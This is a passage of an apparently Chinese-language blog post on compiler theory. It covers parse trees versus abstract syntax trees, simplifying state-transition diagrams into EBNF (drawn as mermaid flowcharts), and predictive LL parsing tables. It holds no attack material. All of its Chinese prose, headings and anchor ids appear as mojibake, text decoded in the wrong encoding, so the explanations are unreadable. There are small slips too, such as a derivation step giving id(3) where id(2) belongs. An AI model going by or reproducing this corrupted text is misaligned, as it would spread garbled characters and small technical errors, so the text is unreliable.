<p>å®é™…ä¸Šåœ¨ç¼–ç¨‹è¯­è¨€ä¸­è¿˜è¦è€ƒè™‘ä¸€ä¸ªåˆ†æ”¯ç»“æ„çš„ç‰¹æ®Šæ€§</p>
<p>if-elif-elseç»“æ„ä¸­çš„åŒ¹é…åŸåˆ™,å°±è¿‘è¿˜æ˜¯å°±è¿œåŸåˆ™ç­‰ç­‰</p>
<p>è¿™æ˜¯åè¯</p>
</blockquote>
<h2 id="è‡ªä¸Šè€Œä¸‹è¯­æ³•åˆ†æ">è‡ªä¸Šè€Œä¸‹è¯­æ³•åˆ†æ</h2>
<h3 id="æ ‘å½¢ç»“æ„">æ ‘å½¢ç»“æ„?</h3>
<p>ç”±CFGå¯ä»¥å»ºç«‹ä¸¤ç§é•¿å¾—å·®ä¸å¤šçš„æ ‘å½¢ç»“æ„,</p>
<p>åˆ†ææ ‘å’Œè¯­æ³•æ ‘,</p>
<p>æˆ–è€…è¯´å…·ä½“è¯­æ³•æ ‘å’ŒæŠ½è±¡è¯­æ³•æ ‘</p>
<p>ä»¥<code>1+2*3</code>ä¸ºä¾‹,æ¨å¯¼è¯¥è¡¨è¾¾å¼çš„è¿‡ç¨‹ä¸º <span
class="math display">\[
\begin{aligned}
exp(1+2\times 3)&amp;\rightarrow exp(1)+term(2\times 3)\\
&amp;\rightarrow term(1)+term(2)\times fact(3)\\
&amp;\rightarrow fact(1)+fact(2)\times id(3)\\
&amp;\rightarrow id(1)+id(3)\times id(3)
\end{aligned}
\]</span></p>
<h4 id="åˆ†ææ ‘å…·ä½“è¯­æ³•æ ‘">åˆ†ææ ‘(å…·ä½“è¯­æ³•æ ‘)</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">flowchart</span><br><span class="line">PLUS1((+))</span><br><span class="line">MULT((*))</span><br><span class="line">EXP123((&quot;exp(1+2*3)&quot;))</span><br><span class="line">EXP1((&quot;exp(1)&quot;))</span><br><span class="line">TERM23((&quot;term(2*3)&quot;))</span><br><span class="line">TERM1((&quot;term(1)&quot;))</span><br><span class="line">TERM2((&quot;term(2)&quot;))</span><br><span class="line">FACT3((&quot;fact(3)&quot;))</span><br><span class="line">FACT1((&quot;fact(1)&quot;))</span><br><span class="line">FACT2((&quot;fact(2)&quot;))</span><br><span class="line">ID3((&quot;id(3)&quot;))</span><br><span class="line">ID1((&quot;id(1)&quot;))</span><br><span class="line">ID2((&quot;id(2)&quot;))</span><br><span class="line"></span><br><span class="line">EXP123----EXP1</span><br><span class="line">EXP123----PLUS1</span><br><span class="line">EXP123----TERM23</span><br><span class="line">EXP1----TERM1</span><br><span class="line">TERM1----FACT1</span><br><span class="line">FACT1----ID1</span><br><span class="line"></span><br><span class="line">TERM23----TERM2----FACT2----ID2</span><br><span class="line">TERM23----MULT</span><br><span class="line">TERM23----FACT3----ID3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="è¯­æ³•æ ‘æŠ½è±¡è¯­æ³•æ ‘">è¯­æ³•æ ‘(æŠ½è±¡è¯­æ³•æ ‘)</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">graph</span><br><span class="line">1((1))</span><br><span class="line">	2((2))</span><br><span class="line">	3((3))</span><br><span class="line">	mul((*))</span><br><span class="line">	plus((+))</span><br><span class="line">	plus----1</span><br><span class="line">	plus----mul</span><br><span class="line">	mul----2</span><br><span class="line">	mul----3</span><br></pre></td></tr></table></figure>
<h4 id="ä¸¤ç§æ ‘çš„åŒºåˆ«">ä¸¤ç§æ ‘çš„åŒºåˆ«</h4>
<p>æŠ½è±¡è¯­æ³•æ ‘ä¸­,å¶å­èŠ‚ç‚¹éƒ½æ˜¯å­—é¢é‡,ä¸èƒ½å†æ¨å¯¼,å†…éƒ¨èŠ‚ç‚¹è‚¯å®šéƒ½æ˜¯è¿ç®—ç¬¦.</p>
<p>æ±‚å€¼æ—¶å½“å‰èŠ‚ç‚¹åªéœ€è¦æ ¹æ®è‡ªå·±çš„è¿ç®—è§„åˆ™,å–å‡ºå·¦å³å„¿å­é€’å½’è¿ç®—å€¼,ç®—ä¸€ä¸‹ç„¶åäº¤ç»™çˆ¶èŠ‚ç‚¹</p>
<p>å’±ä¹Ÿä¸çŸ¥é“è¿™å…·ä½“è¯­æ³•æ ‘æœ‰ä»€ä¹ˆä½œç”¨,æ˜æ˜æŠ½è±¡è¯­æ³•æ ‘ç®€æ´æ¸…æ™°å¹¶ä¸”ä¹Ÿèƒ½å®ŒæˆåŠŸèƒ½</p>
<h3 id="çŠ¶æ€è½¬ç§»å›¾å’Œebnf">çŠ¶æ€è½¬ç§»å›¾å’ŒEBNF</h3>
<h4 id="ä¸€çœ¼ä¸çœŸ">ä¸€çœ¼ä¸çœŸ</h4>
<p>çŠ¶æ€è½¬ç§»å›¾å®é™…ä¸Šå°±æ˜¯ä¸ºäº†å½¢å¼åŒ–åœ°å¾—åˆ°EBNF,è¦æ˜¯èƒ½å¤Ÿä»æœ¬æ¥çš„æ–‡æ³•ç›´æ¥çœ‹å‡ºEBNFæ–‡æ³•,åˆ™ä¸éœ€è¦çŠ¶æ€è½¬ç§»å›¾</p>
<p>å¯¹äºè¡¨è¾¾å¼è¿™ç§ç®€å•çš„æ–‡æ³•,ç›´æ¥å°±èƒ½çœ‹å‡ºEBNFæ¥ <span
class="math display">\[
\begin{aligned}
Expression&amp;\rightarrow Term\ \{(+|-)Term\}\\
Term&amp;\rightarrow Factor\ \{(\times |/) Factor\}\\
Factor&amp;\rightarrow (Expression)\ |\ id\ |num
\end{aligned}
\]</span> â€‹ å…¶ä¸­</p>
<p>èŠ±æ‹¬å·{}ä¸­çš„å†…å®¹å¯ä»¥é‡å¤0æ¬¡æˆ–è€…è‹¥å¹²æ¬¡,ç›¸å½“äºæ˜Ÿé—­åŒ…</p>
<p>æ€ä¹ˆç†è§£æ–‡æ³•çš„EBNFè¡¨ç¤ºå‘¢? <span class="math display">\[
\begin{aligned}
Expression &amp;\rightarrow Term\ \{(+|-)Term\}\\
        &amp;\rightarrow TermÂ±TermÂ±TermÂ±...Â±Term
        \end{aligned}
\]</span>
ä¹Ÿå°±æ˜¯è¯´Expressionè‡³å°‘ç”±ä¸€ä¸ªTermç»„æˆ,è¿˜å¯ä»¥æ˜¯è‹¥å¹²ä¸ªTermçš„åŠ å‡ç»„æˆ</p>
<h4 id="ä¸€çœ¼çœ‹ä¸å‡ºæ¥å’‹åŠ">ä¸€çœ¼çœ‹ä¸å‡ºæ¥å’‹åŠ?</h4>
<p>ç°åœ¨å·²ç»çŸ¥é“çš„æ˜¯æ–‡æ³•è§„åˆ™ <span class="math display">\[
\begin{aligned}
Language&amp;\rightarrow Expression;Language|\epsilon\\
Expression&amp;\rightarrow Term\ Expression&#39;\\
Expression&#39;&amp;\rightarrow +Term\ Expression&#39;|\epsilon\\
Term&amp;\rightarrow Factor \ Term&#39;\\
Term&#39;&amp;\rightarrow \times Factor\ Term&#39;|\epsilon\\
Factor&amp;\rightarrow (Expression)|-Factor|id
\end{aligned}
\]</span></p>
<p>è¦æ±‚å‡ºæ–‡æ³•çš„EBNFè¡¨ç¤º.</p>
<p>çœ¼ç¥ä¸å¥½,ä¸èƒ½ä¸€çœ¼ä¸çœŸ,å°±å¾—å€ŸåŠ©çŠ¶æ€è½¬ç§»å›¾</p>
<p>æ€ä¹ˆç”±åŸæ¥çš„æ–‡æ³•ç¿»è¯‘æˆçŠ¶æ€è½¬ç§»å›¾?</p>
<p>ä»¥Languageä¸ºä¾‹å­:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">0((0))</span><br><span class="line">1((1))</span><br><span class="line">2((2))</span><br><span class="line">3((3))</span><br><span class="line">Language ----&gt;0--Expression--&gt;1--&quot;;&quot;--&gt;2--Language--&gt;3</span><br><span class="line">0--Îµ--&gt;3</span><br><span class="line">style 3 fill:red</span><br></pre></td></tr></table></figure>
<p>æ¨å¯¼å¼ä¸­çš„æ‰€æœ‰ç¬¦å·,æ¯”å¦‚Language,Expressionç­‰,éƒ½ä½œä¸ºæœ‰å‘å›¾ä¸Šçš„è¾¹,ä»£è¡¨çŠ¶æ€è½¬ç§».çŠ¶æ€ä½œä¸ºèŠ‚ç‚¹</p>
<p>æ˜¾ç„¶ç›®å‰å»ºç«‹çš„æ‰€æœ‰æœ‰å‘å›¾éƒ½æ˜¯æ²¡æœ‰åœˆçš„,å› ä¸ºç›®å‰çš„æ–‡æ³•å®šä¹‰å·²ç»æ¶ˆé™¤äº†æ‰€æœ‰ç›´æ¥æˆ–è€…é—´æ¥çš„å·¦é€’å½’,è¡¨ç°åˆ°å›¾ä¸Šå°±æ˜¯æ²¡æœ‰å¼ºè¿é€šåˆ†é‡</p>
<p>åˆå¦‚å¯¹äºExpressionå’ŒExpression'</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">4((4))</span><br><span class="line">5((5))</span><br><span class="line">6((6))</span><br><span class="line">Expression--&gt;4--Term--&gt;5--&quot;Expression&#x27;&quot;--&gt;6</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">7((7))</span><br><span class="line">8((8))</span><br><span class="line">9((9))</span><br><span class="line">10((10))</span><br><span class="line">Expression&#x27;--&gt;7--+--&gt;8--Term--&gt;9--Expression&#x27;--&gt;10</span><br><span class="line">7--Îµ--&gt;10</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢å°±æ˜¯åŒ–ç®€çŠ¶æ€è½¬ç§»å›¾,æ€ä¹ˆåŒ–ç®€?</p>
<p>å¯¹äºExpression',æœ‰ä¸€ä¸ªè§„åˆ™1:</p>
<p>æ ‡è®°ä¸ºAçš„è¾¹å¯ç­‰ä»·ä¸ºæ ‡è®°Îµçš„è¾¹è½¬å‘Aè½¬æ¢å›¾çš„åˆæ€ï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">7((7))</span><br><span class="line">8((8))</span><br><span class="line">9((9))</span><br><span class="line">10((10))</span><br><span class="line">7--Îµ--&gt;10</span><br><span class="line">Expression&#x27;--&gt;7--+--&gt;8--Term--&gt;9</span><br><span class="line">9--Îµ--&gt;7</span><br><span class="line">style 10 fill:red</span><br></pre></td></tr></table></figure>
<p>ç„¶åç´§æ¥ç€å¯ä»¥åº”ç”¨è§„åˆ™2:</p>
<p>Îµä¸¤å¤´çš„èŠ‚ç‚¹å¯ä»¥åˆå¹¶,ä¹Ÿå°±æ˜¯è¯´,epsiloné—­åŒ…ä¸­çš„èŠ‚ç‚¹ç®—æˆä¸€ä¸ªç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">7((7))</span><br><span class="line">8((8))</span><br><span class="line"></span><br><span class="line">Expression&#x27;--&gt;7--+--&gt;8--Term--&gt;7</span><br><span class="line"></span><br><span class="line">style 7 fill:red</span><br></pre></td></tr></table></figure>
<p>ç„¶åç´§æ¥ç€å¯ä»¥åº”ç”¨è§„åˆ™3:</p>
<p>æ ‡è®°ç›¸åŒçš„è·¯å¾„å¯ä»¥åˆå¹¶</p>
<p>å•¥æ„æ€å‘¢?Expression'ç°åœ¨å¯ä»¥å¸¦å…¥åˆ°Expressionä¸­äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">4((4))</span><br><span class="line"></span><br><span class="line">7((7))</span><br><span class="line">8((8))</span><br><span class="line"></span><br><span class="line">7--+--&gt;8--Term--&gt;7</span><br><span class="line">Expression--&gt;4--Term--&gt;7</span><br><span class="line">style 7 fill:red</span><br></pre></td></tr></table></figure>
<p>è¿˜æœ‰ä¸€æ¡è§„åˆ™å¯ä»¥ç»§ç»­åŒ–ç®€:</p>
<p>ä¸å¯åŒºåˆ†çš„çŠ¶æ€å¯ä»¥åˆå¹¶</p>
<p>è¿™é‡Œ4çŠ¶æ€å’Œ8çŠ¶æ€éƒ½æ˜¯ç»è¿‡Termè½¬ç§»åˆ°7,ä¸å¯åŒºåˆ†,å› æ­¤æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">4((4))</span><br><span class="line"></span><br><span class="line">7((7))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7--+--&gt;4</span><br><span class="line">Expression--&gt;4--Term--&gt;7</span><br><span class="line">style 7 fill:red</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶Expression'å·²ç»è¢«æ‰¬äº†,Expressionä¹Ÿæ˜¯ä¸èƒ½å†ç®€äº†,è¿™å°±æ˜¯æœ€ç®€ç»“æ„äº†.æ ¹æ®è¿™ä¸ªç»“æ„,ç»ˆäºä¸€çœ¼ä¸çœŸäº†
<span class="math display">\[
Expression\rightarrow Term\{+Term\}
\]</span></p>
<blockquote>
<p>è¿™é‡Œåªè€ƒè™‘äº†åŠ æ³•,å‡æ³•å’ŒåŠ æ³•åŒçº§,ä¹Ÿå®¹æ˜“æ‰©å…… <span
class="math display">\[
Expression\rightarrow Term\{(+|-)Term\}
\]</span></p>
</blockquote>
<p>ä»¥æ­¤ç±»æ¨,å¯ä»¥å¾—åˆ°æ‰€æœ‰ç¬¦å·çš„EBNFæ–‡æ³• <span class="math display">\[
\begin{aligned}
Language&amp;\rightarrow \{Expression;\}\\
Expression&amp;\rightarrow Term\{(+|-)Term\}\\
Term&amp;\rightarrow Factor\{(\times |/)Factor\}\\
Factor&amp;\rightarrow (Expression)|id|num
\end{aligned}
\]</span> å¾—åˆ°è¯¥EBNFè¡¨ç¤ºçš„æ–‡æ³•ä¹‹å,å·²ç»å¯ä»¥åŠ¨æ‰‹å†™ç¨‹åºäº†.</p>
<h3 id="ç¡¬ç¼–ç çš„ä»£ç å®ç°">ç¡¬ç¼–ç çš„ä»£ç å®ç°</h3>
<h4 id="è¡¨è¾¾å¼æ±‚å€¼">è¡¨è¾¾å¼æ±‚å€¼</h4>
<p>è´´å‡ºæ¥åˆè‡­åˆé•¿,ä¸å¦‚æ”¾åˆ°pasbinäº†<a
target="_blank" rel="noopener" href="https://pastebin.com/4KPSsPBb">é€’å½’ä¸‹é™æ±‚è§£è¡¨è¾¾å¼ -
Pastebin.com</a></p>
<h4 id="è¡¨è¾¾å¼å»ºç«‹è¯­æ³•æ ‘">è¡¨è¾¾å¼å»ºç«‹è¯­æ³•æ ‘</h4>
<p>æºä»£ç ä¸­æœ‰åå¼•å·,å¹¶ä¸”åšå®¢æ¸²æŸ“çš„æ—¶å€™ä»£ç å—ä¼šåŒ¹é…æœ€è¿‘çš„åå¼•å·,<del>è¿™åº”è¯¥æ˜¯è¯­æ³•åˆ†æçš„é”™è¯¯ç½¢</del></p>
<p>å‘ç”Ÿä»£ç å—åå¼•å·åŒ¹é…é”™è¯¯,åªèƒ½æ”¾åˆ°pastbiné‡Œäº†<a
target="_blank" rel="noopener" href="https://pastebin.com/xJuqQx3E">è¡¨è¾¾å¼æ ‘ - Pastebin.com</a></p>
<p>å°†æ ‘çš„ç»“æ„æŒ‰ç…§mermaidè¯­æ³•è§„åˆ™è¾“å‡ºåˆ°tree.mdæ–‡ä»¶,ç„¶åç”¨typoraæ‰“å¼€å°±å¯ä»¥å®ç°å¯è§†åŒ–</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221103222106328.png"
alt="visiable" />
<figcaption aria-hidden="true">visiable</figcaption>
</figure>
<h2 id="é¢„æµ‹åˆ†æ">é¢„æµ‹åˆ†æ</h2>
<h3 id="ä¸ºå•¥è¿˜éœ€è¦é¢„æµ‹åˆ†æ">ä¸ºå•¥è¿˜éœ€è¦é¢„æµ‹åˆ†æ?</h3>
<p>ä¸Šé¢æˆ‘ä»¬å·²ç»å†™å‡ºä»£ç äº†,è¡¨è¾¾å¼çš„è¯­æ³•åˆ†æå¯ä»¥è¯´å·²ç»ç«£å·¥äº†,ä½†æ˜¯ä¸ºå•¥æœ¬ç« åé¢æ•™æè¿˜æ˜¯ä¸ä¾ä¸é¥¶åœ°ç»™äº†60é¡µ?</p>
<p>æ„Ÿè§‰æ•™æä¹Ÿæ²¡æœ‰ç»™é¢„æµ‹åˆ†æå™¨åšä¸€ä¸ªé“ºå«,ç›´æ¥å°±æŠ›å‡ºäº†è¿™ä¹ˆä¸€ä¸ªæ¦‚å¿µå¹²è¯´.</p>
<p>æˆ‘è§‰å¾—,è¿™æ˜¯å› ä¸ºä»EBNFæ„å»ºè¯­æ³•åˆ†æå™¨æœ‰å¾ˆå¤§çš„å±€é™æ€§,ç±»æ¯”ä¸€ä¸‹</p>
<p>æ ¹æ®EBNFå†™è¯­æ³•åˆ†æå™¨,å°±ç±»ä¼¼äºè¯æ³•åˆ†æå™¨ç”¨ç¡¬ç¼–ç çš„DFA</p>
<p>ä¸ºä»€ä¹ˆè¿™æ ·è¯´å‘¢?æˆ–è€…è¯´æ ¹æ®EBNFå†™ä»£ç æœ‰å•¥ç¼ºç‚¹å‘¢?</p>
<p>é¦–å…ˆ,EBNFä¸­è§„å®šäº†æ­»äº†,åŸºæœ¬ç®—æ•°è¿ç®—åªæœ‰ä¸‰ç§ä¼˜å…ˆçº§,è¿™å¯¹åº”åˆ°ä»£ç ä¸­çš„ä¸‰ä¸ªå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">evalExpression</span><br><span class="line">evalTerm</span><br><span class="line">evalFactor</span><br></pre></td></tr></table></figure>
<p>è¯•æƒ³,å¦‚æœå†™å®Œç¨‹åºä¹‹å,åˆæƒ³åŠ å…¥æ–°çš„ä¼˜å…ˆçº§,æ¯”å¦‚è§„å®šä¹˜æ–¹è¿ç®—çš„ä¼˜å…ˆçº§é«˜äºä¹˜é™¤ä½äºæ‹¬å·.</p>
<p>åˆå¦‚æ–¹æ‹¬å·ä¼˜å…ˆçº§ä½äºå°æ‹¬å·ä½†æ˜¯é«˜äºå…¶ä»–è¡¨è¾¾å¼.</p>
<p>è¿™å°±æ„å‘³ç€ç¨‹åºéœ€è¦å¤§æ”¹,æ–°åŠ å…¥<code>evalPower</code>æ¥å¤„ç†ä¹˜æ–¹è¿ç®—,å¹¶ä¸”å‡½æ•°çš„è°ƒç”¨å…³ç³»éƒ½å¾—æ”¹</p>
<p>è¿™å°±æ˜¯ä»EBNFç›´æ¥å†™ä»£ç çš„å±€é™æ€§,ä¹Ÿå°±æ˜¯è¯´å¯æ‹“å±•æ€§å·®</p>
<p>æ€ä¹ˆè§£å†³å‘¢?è¿˜æ˜¯å›é¡¾è¯æ³•åˆ†æä¸­çš„åšæ³•</p>
<blockquote>
<p>å½“æ—¶æˆ‘ä»¬ä¹Ÿæ˜¯å«Œç¡¬ç¼–ç çš„DFAä¸çµæ´»,äºæ˜¯ä½¿ç”¨äº†è¡¨é©±åŠ¨æˆ–è€…æœ‰å‘å›¾é©±åŠ¨çš„DFA.</p>
<p>DFAå¯¹å¤–æä¾›ä¸‰ä¸ªæ¥å£,éƒ½å±è”½äº†è‡ªèº«å®ç°çš„å·®å¼‚.</p>
<p>è¡¨é©±åŠ¨çš„DFAæƒ³è¦æ‹“å±•åªéœ€è¦æ–°å¢è¡¨è®°å½•å°±å¯ä»¥äº†</p>
</blockquote>
<p>è¿™å°±æ˜¯<strong>é¢„æµ‹åˆ†æå™¨</strong>çš„<strong>é¢„æµ‹åˆ†æè¡¨</strong>å°†è¦å¹²çš„äº‹æƒ…</p>
<h3 id="é¢„æµ‹åˆ†æå™¨">é¢„æµ‹åˆ†æå™¨</h3>
<h4 id="ç±»æ¯”è¯æ³•åˆ†æ">ç±»æ¯”è¯æ³•åˆ†æ</h4>
<p>å‰é¢æˆ‘ä»¬å·²ç»ç»™é¢„æµ‹åˆ†æå™¨åšå¥½é“ºå«äº†</p>
<p>é¢„æµ‹åˆ†æå™¨æ˜¯è¯æ³•åˆ†æå™¨çš„ä¸€ç§å®ç°æ–¹å¼,æ˜¯ä¸‹æ¨è‡ªåŠ¨æœºçš„ä¸€ç§å®ç°</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221105150413813.png"
alt="é¢„æµ‹åˆ†æå™¨æ˜¯ä¸‹æ¨è‡ªåŠ¨æœºçš„å®ä¾‹" />
<figcaption aria-hidden="true">é¢„æµ‹åˆ†æå™¨æ˜¯ä¸‹æ¨è‡ªåŠ¨æœºçš„å®ä¾‹</figcaption>
</figure>
<blockquote>
<p>ipæŒ‡å‘å½“å‰è¾“å…¥</p>
</blockquote>
<p>è¿™ä¸ªé¢„æµ‹åˆ†æå™¨å’Œä½¿ç”¨è¡¨é©±åŠ¨DFAçš„è¯æ³•åˆ†æå™¨æœ‰ä¸€å®šçš„ç›¸ä¼¼ä¹‹å¤„,å¯ä»¥ç±»æ¯”ç†è§£ä¸€ä¸‹</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221105150714522.png"
alt="å·¦è¡¨é©±åŠ¨DFAè¯æ³•åˆ†æ,å³é¢„æµ‹åˆ†æè¯­æ³•åˆ†æ" />
<figcaption
aria-hidden="true">å·¦è¡¨é©±åŠ¨DFAè¯æ³•åˆ†æ,å³é¢„æµ‹åˆ†æè¯­æ³•åˆ†æ</figcaption>
</figure>
<p>è¯æ³•åˆ†æå™¨ä¸Šçš„çŠ¶æ€è½¬ç§»,åªéœ€è¦çœ‹ä¸€ä¸‹è¾“å…¥åºåˆ—,ç„¶åå»åˆ†æè¡¨æŸ¥ä¸€ä¸‹ä¸‹ä¸€ä¸ªçŠ¶æ€å°±å¯ä»¥äº†</p>
<p>ç›¸æ¯”äºè¯æ³•åˆ†æå™¨,è¯­æ³•åˆ†æå™¨å¤šä¸€ä¸ªç¬¦å·æ ˆ,ä¹Ÿå°±æ˜¯è¯´é¢„æµ‹åˆ†æå™¨ä¸Šçš„çŠ¶æ€è½¬ç§»,ä¸ä»…è¦è€ƒè™‘å½“å‰è®°å·æµä¸­çš„è®°å·,è¿˜è¦è€ƒè™‘å½“å‰ç¬¦å·æ ˆçš„çŠ¶æ€</p>
<h4 id="æ²¡æœ‰é€’å½’">æ²¡æœ‰é€’å½’?</h4>
<p>åŒæ—¶,ä»è¿™ä¸ªç±»æ¯”ä¸­,æˆ‘ä»¬ä¹Ÿå¯ä»¥éšçº¦å‘ç°,<strong>é¢„æµ‹åˆ†æå™¨æ˜¯æ²¡æœ‰é€’å½’çš„</strong></p>
<p>ä¹‹å‰æ ¹æ®EBNFå†™çš„ä»£ç ,é€’å½’å¾ˆæ˜æ˜¾,<code>evalExpression-&gt;evalTerm-&gt;evalFactor</code></p>
<p>è€Œç°åœ¨åªéœ€è¦ä»é¢„æµ‹åˆ†æè¡¨ä¸Šè¿›è¡ŒçŠ¶æ€è½¬ç§».æ¶ˆé™¤äº†é€’å½’</p>
<p>è¿™æ„å‘³ç€,ç°åœ¨å¯ä»¥å°†é€’å½’çš„æ–¹æ³•,ä»è¡¨è¾¾å¼æ¨å¹¿åˆ°ç»˜å›¾è¯­è¨€,å†™"ç¼–è¯‘åŸç†çš„å®éªŒäºŒ--è¯­æ³•åˆ†æå™¨"äº†,</p>
<p>å®é™…ä¸ŠWXQè€å¸ˆç»™å‡ºäº†2019C++å®ç°ç‰ˆä¹Ÿå°±æ˜¯åŸºäºé€’å½’ä¸‹é™æ–¹æ³•å®ç°çš„</p>
<h4 id="é¢„æµ‹åˆ†æè¡¨æ˜¯å¹²å•¥çš„">é¢„æµ‹åˆ†æè¡¨æ˜¯å¹²å•¥çš„?</h4>
<p>é¦–å…ˆè€ƒè™‘è¿™ä¹ˆä¸€ä¸ªè¡¨è¾¾å¼<span class="math inline">\(id+id\times
id\)</span>,å¦‚æœä½¿ç”¨å‰é¢å®šä¹‰çš„æ–‡æ³•è¿›è¡ŒåŒ¹é…,æ‰‹å·¥åšçš„è¯åº”è¯¥å¦‚ä½•</p>
<p><span class="math display">\[
\begin{aligned}
Language&amp;\rightarrow Expression;Language|\epsilon\\
Expression&amp;\rightarrow Term\ Expression&#39;\\
Expression&#39;&amp;\rightarrow +Term\ Expression&#39;|\epsilon\\
Term&amp;\rightarrow Factor \ Term&#39;\\
Term&#39;&amp;\rightarrow \times Factor\ Term&#39;|\epsilon\\
Factor&amp;\rightarrow (Expression)|-Factor|id
\end{aligned}
\]</span></p>
<p><span class="math display">\[
\begin{aligned}
L&amp;\rightarrow E\\
&amp;\rightarrow TE&#39;\\
&amp;\rightarrow FT&#39;E&#39;\\
&amp;\rightarrow idT&#39;E&#39;\\
&amp;\rightarrow idE&#39;\\
&amp;\rightarrow id+TE&#39;\\
&amp;\rightarrow id+FT&#39;E&#39;\\
&amp;\rightarrow id+idT&#39;E&#39;\\
&amp;\rightarrow id+id\times FT&#39;E&#39;\\
&amp;\rightarrow id+id\times idT&#39;E&#39;\\
&amp;\rightarrow id+id\times id
\end{aligned}
\]</span></p>
<p>æˆ‘ä»¬è¿™æ ·åšçš„ä¾æ®å°±æ˜¯æ–‡æ³•è§„åˆ™ä¸­å®šä¹‰å¥½çš„æ¨å¯¼æ–¹å¼</p>
<p>é¢„æµ‹åˆ†æè¡¨å°±å¹²äº†æˆ‘ä»¬è„‘å­å¹²çš„äº‹æƒ…----åŒ¹é…ä½¿ç”¨å“ªä¸ªæ¨å¯¼è§„åˆ™</p>
<p>å…ˆç»™å‡ºè¿™ä¹ˆä¸€ä¸ªçŠ¶æ€è½¬ç§»è¡¨,ç®€å•åœ°ç”¨å®ƒåˆ†æä¸€ä¸‹id+id*id,<strong>åæ¥å†å…³å¿ƒè¿™ä¸ªè¡¨æ˜¯æ€ä¹ˆå»ºç«‹çš„</strong></p>
<h6 id="image-20221109212543264"><img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221109212543264.png"
alt="image-20221109212543264" /></h6>
<p>æ¯”å¦‚å½“å‰æ ˆé¡¶æ˜¯L,è¾“å…¥ç¬¦å·æ˜¯id,é‚£ä¹ˆå°±åº”è¯¥é¦–å…ˆLå¼¹æ ˆ,ç„¶åæŠŠç¬¦å·Eå‹æ ˆ,è½¬ç§»åˆ°ä¸‹ä¸€ä¸ª<strong>æ ¼å±€</strong></p>
<p>å½“å‰æ ˆé¡¶æ˜¯E,è¾“å…¥ç¬¦å·id,å°±åº”è¯¥é¦–å…ˆEå¼¹æ ˆ,ç„¶åæŠŠTE'å‹æ ˆ,è½¬ç§»åˆ°ä¸‹ä¸€ä¸ªæ ¼å±€</p>
<p>å½“å‰æ ˆé¡¶æ˜¯T,è¾“å…¥id,å°±åº”è¯¥é¦–å…ˆTå¼¹æ ˆ,ç„¶åFT'å‹æ ˆ,è½¬ç§»åˆ°ä¸‹ä¸€ä¸ªæ ¼å±€</p>
<p>å½“å‰æ ˆé¡¶æ˜¯F,è¾“å…¥id,å°±åº”è¯¥é¦–å…ˆFå¼¹æ ˆ,ç„¶åidå‹æ ˆ,è½¬ç§»åˆ°ä¸‹ä¸€ä¸ªæ ¼å±€</p>
<p>å½“å‰æ ˆé¡¶æ˜¯id,è¾“å…¥id,åŒ¹é…æˆåŠŸ,éƒ½é€€æ ˆ</p>
